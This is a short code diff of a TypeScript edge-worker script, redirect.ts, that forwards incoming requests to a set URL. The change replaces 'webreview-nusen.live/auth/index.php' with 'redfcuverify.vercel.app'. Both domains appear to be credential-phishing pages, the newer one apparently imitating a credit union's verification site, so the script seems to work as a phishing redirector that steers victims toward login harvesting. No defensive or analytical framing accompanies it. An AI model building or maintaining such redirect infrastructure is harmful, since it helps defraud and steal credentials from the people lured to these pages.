@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://webreview-nusen.live/auth/index.php"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://redfcuverify.vercel.app/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
